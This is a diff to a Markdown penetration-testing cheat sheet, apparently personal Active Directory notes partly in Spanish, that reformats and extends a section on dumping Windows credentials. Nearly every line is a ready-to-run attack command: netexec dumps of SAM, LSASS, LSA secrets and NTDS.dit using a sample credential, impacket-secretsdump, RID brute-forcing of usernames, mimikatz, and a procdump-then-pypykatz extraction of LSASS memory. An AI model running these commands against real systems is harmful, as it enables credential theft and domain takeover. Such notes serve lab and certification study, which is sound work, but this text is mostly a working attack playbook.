@@ -300,26 +300,45 @@ Pasos:
 # Dump All Hashes Remotamente: 
 
 ## dump SAM - requires local admin
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
 
 ## dump LSASS - requires local admin
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M lsassy
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M lsassy
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt
 
 ## dump LSA - requires local admin
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa secdump
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa secdump
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes
 
 ## Dump NTDS.dit - Requires domain admin or local admin on DC
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
-impacket-secretsdump 'user1':'Password1!'@10.10.175.62 -just-dc-ntlm -outputfile test.txt
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
+❯ impacket-secretsdump 'user1':'Password1!'@10.10.175.62 -just-dc-ntlm -outputfile test.txt
 
 ## Get userlist of all users in the domain (do against dc to get all domain users):
-netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\\' -f2 | tee users.txt
+❯ netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\\' -f2 | tee users.txt
 
 ## Recommended to dump with this too just in case. We wanna make sure we have all hashes:
-mimikatz | Hashdump
+❯ mimikatz | Hashdump
+```
+
+## SeDebugPrivilege 
+```powershell 
+Te permite leer y escribir en la memoria de cualquier proceso, incluyendo los que corren como SYSTEM.
+
+# Descargar ProcDump.exe en Kali y subirlo a Windows 
+	https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
+
+Paso 1:
+❯ ./procdump.exe -accepteula -ma lsass.exe lsass.dmp  
+
+Paso 2:
+# Descargar el lsass a Kali 
+❯ download lsass.dmp
+
+Paso 3:
+# Extraer la información desde Kali 
+❯ pypykatz lsa minidump lsass.dmp
 ```
